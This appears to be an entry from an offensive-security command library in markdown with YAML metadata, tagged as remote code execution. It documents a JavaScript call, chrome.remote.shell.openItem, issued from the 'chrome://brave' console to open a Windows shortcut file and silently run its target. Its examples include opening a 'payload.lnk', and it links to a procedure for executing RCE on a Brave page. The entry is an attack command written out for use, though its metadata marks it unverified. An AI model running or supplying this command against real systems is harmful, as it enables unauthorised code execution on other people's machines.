---
id: cmd-uuid-2
data: 'chrome.remote.shell.openItem("C://a//test.lnk")'
tags:
  - rce
  - execution
type: command
output: null
executor: javascript
platforms:
  - Microsoft Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:31.235Z'
verified: false
validated: true
submitted: true
---
# chrome-remote-shell-openitem-a

## Command

```javascript
chrome.remote.shell.openItem("C://a//test.lnk");
```

## Description

This JavaScript command invokes the Chrome remote shell API in the 'chrome://brave' console to open a .lnk file in a custom directory (C:\a\), demonstrating RCE by executing the shortcut's target on Windows. Use for paths requiring directory creation, but prefer existing dirs to avoid issues.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| path | Escaped path to .lnk file (e.g., "C://a//test.lnk") | Yes |

## Examples

### Basic Usage

```javascript
chrome.remote.shell.openItem("C://a//test.lnk");
```

### Advanced Usage

```javascript
chrome.remote.shell.openItem("C://a//payload.lnk");
```

## Expected Output

Silent execution of the .lnk target; monitor system for spawned processes. May fail if directory doesn't exist, resulting in no action or error.

## Related

- [[Related Procedure: Execute-RCE-on-chrome-brave-Page]]
